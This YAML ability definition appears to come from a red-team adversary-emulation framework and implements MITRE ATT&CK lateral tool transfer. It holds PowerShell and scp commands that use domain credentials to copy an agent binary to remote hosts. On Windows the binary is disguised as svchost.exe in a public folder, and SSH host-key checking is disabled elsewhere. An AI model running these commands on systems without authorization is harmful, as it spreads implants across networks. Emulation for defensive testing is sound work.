- id: 4908fdc4-74fc-4d7c-8935-26d11ad26a8d
  name: Copy 54ndc47 (WinRM and SCP)
  description: Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP
  tactic: lateral-movement
  technique:
    attack_id: T1570
    name: Lateral Tool Transfer
  platforms:
    windows:
      psh,pwsh:
        command: "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\"\
          ;\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName\
          \ System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object\
          \ {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential\
          \ -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName\
          \ \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\"\
          ;\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\\
          Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n\
          \  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n"
        cleanup: "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\"\
          ;\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName\
          \ System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object\
          \ {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential\
          \ -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName\
          \ \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session\
          \ $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n\
          \  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job\
          \ -Job $job -Wait;\n"
        payloads:
        - sandcat.go-windows
    darwin:
      sh:
        command: 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
          -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go

          '
        cleanup: 'ssh -o ConnectTimeout=3 #{remote.ssh.cmd} ''rm -f sandcat.go''

          '
        payloads:
        - sandcat.go-darwin
    linux:
      sh:
        command: 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
          -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go

          '
        cleanup: 'ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd}
          ''rm -f sandcat.go''

          '
        payloads:
        - sandcat.go-linux
  singleton: true
